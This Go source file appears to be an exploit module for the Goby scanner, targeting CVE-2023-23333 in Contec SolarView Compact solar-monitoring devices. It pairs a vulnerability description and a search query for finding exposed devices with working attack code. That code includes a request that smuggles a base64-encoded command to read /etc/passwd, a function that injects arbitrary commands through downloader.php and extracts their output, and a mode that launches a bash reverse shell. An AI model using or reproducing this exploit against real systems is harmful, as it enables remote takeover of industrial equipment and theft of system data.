package exploits

import (
	"crypto/md5"
	b64 "encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "SolarView Compact downloader.php RCE (CVE-2023-23333)",
    "Description": "<p>There is a command injection vulnerability in SolarView Compact through 6.00, attackers can execute commands by bypassing internal restrictions through downloader.php.</p>",
    "Product": "SolarView-Compact",
    "Homepage": "https://www.contec.com/cn",
    "DisclosureDate": "2023-02-06",
    "Author": "idlefire@outlook.com",
    "FofaQuery": "body=\"SolarView Compact\"",
    "GobyQuery": "body=\"SolarView Compact\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update<a href=\"https://www.contec.com/\">https://www.contec.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p> 3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-23333"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/downloader.php?file=;echo%20Y2F0IC9ldGMvcGFzc3dkCg==|base64%20-d|bash%00.zip",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root:",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-23333"
    ],
    "CNNVD": [
        "CNNVD-202302-458"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "10.0",
    "Translation": {
        "CN": {
            "Name": "SolarView Compact downloader.php 任意命令执行漏洞（CVE-2023-23333）",
            "Product": "SolarView-Compact",
            "Description": "<p>Contec SolarView Compact是日本Contec公司的一个应用系统，提供光伏发电测量系统。<br></p><p>SolarView Compact 6.00以下存在命令注入漏洞，攻击者可以通过downloader.php绕过内部限制执行命令。.<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.contec.com/cn\">https://www.contec.com/cn</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "SolarView Compact downloader.php RCE (CVE-2023-23333)",
            "Product": "SolarView-Compact",
            "Description": "<p>There is a command injection vulnerability in SolarView Compact through 6.00, attackers can execute commands by bypassing internal restrictions through downloader.php.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update<a href=\"https://www.contec.com/\" target=\"_blank\">https://www.contec.com/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-07-27",
    "PocId": "10809"
}`

	executeCommandJIOWEJ := func(hostInfo *httpclient.FixUrl, cmd string) string {
		getRequestConfig := httpclient.NewGetRequestConfig("/downloader.php?" + "file=;echo%20" + b64.URLEncoding.EncodeToString([]byte(cmd)) + "|base64%20-d|bash%00.zip")
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = true
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil {
			return ""
		}
		return response.Utf8Html
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			randomStr := goutils.RandomHexString(5)
			respHtml := executeCommandJIOWEJ(hostInfo, fmt.Sprintf("echo -n \"%s\" | md5sum", randomStr))
			return strings.Contains(respHtml, fmt.Sprintf("%x", md5.Sum([]byte(randomStr))))
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if stepLogs.Params["attackType"].(string) == "cmd" {
				respHtml := executeCommandJIOWEJ(expResult.HostInfo, stepLogs.Params["cmd"].(string))
				reg, _ := regexp.Compile(`/home/contec/data/\.zip\)([\w\W]*?)<!DOCTYPE`)
				if !strings.Contains(respHtml, "<!DOCTYPE") {
					reg, _ = regexp.Compile(`/home/contec/data/\.zip\)([\w\W]*?)<HTML>`)
				}
				results := reg.FindAllStringSubmatch(respHtml, -1)
				if len(results) > 0 && len(results[0]) > 1 {
					expResult.Success = true
					expResult.Output = results[0][1]
				}
			} else if stepLogs.Params["attackType"].(string) == "reverse" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse", waitSessionCh); err != nil || len(rp) == 0 {
					expResult.Output = "godclient bind failed!"
					expResult.Success = false
					return expResult
				} else {
					cmd := godclient.ReverseTCPByBash(rp)
					executeCommandJIOWEJ(expResult.HostInfo, cmd)
					select {
					case webConsoleID := <-waitSessionCh:
						if u, err := url.Parse(webConsoleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}
